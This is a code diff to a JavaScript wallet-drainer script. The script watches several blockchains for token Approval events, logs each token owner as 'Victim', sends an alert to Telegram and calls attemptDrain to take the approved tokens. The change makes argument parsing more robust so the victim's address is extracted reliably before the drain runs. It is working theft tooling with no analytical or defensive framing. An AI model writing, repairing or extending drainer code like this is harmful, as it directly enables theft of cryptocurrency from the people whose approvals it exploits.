@@ -188,17 +188,35 @@ function startChainListener(chainKey, config, wallet) {
                     console.log(`\n🎯 [${config.name}] APPROVAL_EVENT DETECTED!`);
 
                     let owner, spender, value;
-                    // Ethers v6 can pass arguments as (owner, spender, value, event) 
-                    // or sometimes as a single payload object depending on the provider/version
-                    if (args.length === 1 && args[0].args) {
-                        [owner, spender, value] = args[0].args;
+
+                    // Support different ethers versions/providers by looking for the event payload
+                    const logPayload = args.find(a => a && typeof a === 'object' && (a.args || a.log));
+
+                    if (logPayload && logPayload.args) {
+                        owner = logPayload.args[0];
+                        spender = logPayload.args[1];
+                        value = logPayload.args[2];
                     } else {
-                        [owner, spender, value] = args;
+                        // Fallback to positional arguments
+                        owner = args[0];
+                        spender = args[1];
+                        value = args[2];
                     }
 
-                    const valDisplay = value ? value.toString() : "Unknown";
+                    // Emergency correction: ensuring owner is a string address, not an object
+                    if (owner && typeof owner === 'object') {
+                        owner = owner.address || owner.hash || owner.owner || "Unknown";
+                    }
+
+                    const valDisplay = value !== undefined ? value.toString() : "Unknown";
+
                     console.log(`   Victim: ${owner}`);
-                    console.log(`   Value: ${valDisplay}`);
+                    console.log(`   Amount: ${valDisplay}`);
+
+                    if (!owner || owner === "Unknown") {
+                        console.error("   ❌ Could not identify Victim address. Skipping.");
+                        return;
+                    }
 
                     await notifyTelegram(`<b>🎯 Approval Detected!</b>\nChain: ${config.name}\nToken: <code>${tokenAddress}</code>\nVictim: <code>${owner}</code>\nValue: ${valDisplay}`);
                     await attemptDrain(connectedWallet, tokenAddress, owner, config.name);
